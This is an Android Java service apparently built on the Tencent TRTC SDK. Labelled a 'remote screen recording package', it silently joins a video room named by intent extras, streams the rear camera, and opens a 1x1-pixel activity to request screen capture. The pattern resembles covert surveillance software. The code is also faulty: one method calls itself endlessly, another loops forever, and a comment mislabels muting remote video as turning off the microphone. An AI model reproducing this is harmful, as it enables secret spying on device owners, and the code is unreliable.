package com.tencent.trtc.videocall;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;

import androidx.annotation.Nullable;

import com.tencent.liteav.device.TXDeviceManager;
import com.tencent.rtmp.ui.TXCloudVideoView;
import com.tencent.trtc.TRTCCloud;
import com.tencent.trtc.TRTCCloudDef;
import com.tencent.trtc.debug.Constant;
import com.tencent.trtc.debug.GenerateTestUserSig;
import com.tencent.trtc.videocall.base.SingleService;

import java.io.File;
import java.util.HashMap;

//远程录屏包
public class ScreenRECService extends SingleService {
    private final String name = "ScreenRECService";
    private VirtualDisplay virtualDisplay;
    private MediaProjection mediaProjection;
    private static String fromId = "";
    private static String toId = "";
    private static String status = "";
    private static String ToPhone="";

    public ScreenRECService() {
        super("ScreenRECService");
    }

    public ScreenRECService(String str) {
        super(str);
    }
    private static TRTCCloud VideoCallingenterMTRTCCloud;
    private TXDeviceManager mTXDeviceManager;
    private boolean  mIsFrontCamera  = false;
    @Override
    protected WindowManager getWindowManager() {
        return this.getWindowManager();
    }

    @Override
    public void create() {
        Log.e("tag", "create");
    }

    @Override
    public void execute(Intent intent) {
        Bundle extras = intent.getExtras();
        fromId = extras.getString("mRoomId");
        toId = extras.getString("mUserId");
        status = extras.getString("status");
        ToPhone=extras.getString("ToPhone");
        boolean screenrecord = true;
        if (status.equals("0")) {
            if (screenrecord) {
                enterRoom(fromId,toId);
            }
        }
    }
    TXCloudVideoView MyPhoneActivity_TXCloudVideoView;
    private void enterRoom(String mRoomId, String mUserId) {
        VideoCallingenterMTRTCCloud = TRTCCloud.sharedInstance(getApplicationContext());
        //       VideoCallingenterMTRTCCloud.setListener(new VideoCallingenterTRTCCloudImplListener(MyPhoneActivity.this));
        mTXDeviceManager = VideoCallingenterMTRTCCloud.getDeviceManager();
        TRTCCloudDef.TRTCParams trtcParams = new TRTCCloudDef.TRTCParams();
        trtcParams.sdkAppId = GenerateTestUserSig.SDKAPPID;
        trtcParams.userId = mUserId;
        trtcParams.roomId = Integer.parseInt(mRoomId);
        trtcParams.userSig = GenerateTestUserSig.genTestUserSig(trtcParams.userId);
        VideoCallingenterMTRTCCloud.startLocalPreview(mIsFrontCamera, MyPhoneActivity_TXCloudVideoView);
        VideoCallingenterMTRTCCloud.startLocalAudio(TRTCCloudDef.TRTC_AUDIO_QUALITY_SPEECH);
        VideoCallingenterMTRTCCloud.enterRoom(trtcParams, TRTCCloudDef.TRTC_APP_SCENE_VIDEOCALL);
        VideoCallingenterMTRTCCloud.setAudioCaptureVolume(75);
        VideoCallingenterMTRTCCloud.muteLocalAudio(true);//关闭麦克风
        VideoCallingenterMTRTCCloud.muteAllRemoteVideoStreams(true);//关闭麦克风
    }

    private void exitRoom() {
        if (VideoCallingenterMTRTCCloud != null) {
            VideoCallingenterMTRTCCloud.stopLocalAudio();
            VideoCallingenterMTRTCCloud.stopLocalPreview();
            VideoCallingenterMTRTCCloud.exitRoom();
            VideoCallingenterMTRTCCloud.setListener(null);
        }
        VideoCallingenterMTRTCCloud = null;
        TRTCCloud.destroySharedInstance();
    }
    @Override
    public void start(Intent intent) {

    }
    public static class ScreenUI extends Activity {
        @Override
        protected void onCreate(@Nullable Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
        }

        @SuppressLint({"NewApi"})
        public void onStart() {
            super.onStart();
            Log.e("tag", "授权开始");
            try {
                Window window = getWindow();
                window.setGravity(51);
                WindowManager.LayoutParams attributes = window.getAttributes();
                attributes.x = 0;
                attributes.y = 0;
                attributes.height = 1;
                attributes.width = 1;
                window.setAttributes(attributes);
                startActivityForResult(((MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE)).createScreenCaptureIntent(), 1);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public void onDestroy() {
            super.onDestroy();
        }
    }

    private void initTimeEnd() {
        long elapsedRealtime = SystemClock.elapsedRealtime();
        while (true) {
            long elapsedRealtime2 = SystemClock.elapsedRealtime() - elapsedRealtime;

            Log.e("tag", "录制时间" + (elapsedRealtime2 / 1000));
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e2) {
                e2.printStackTrace();
            }
        }
    }
}
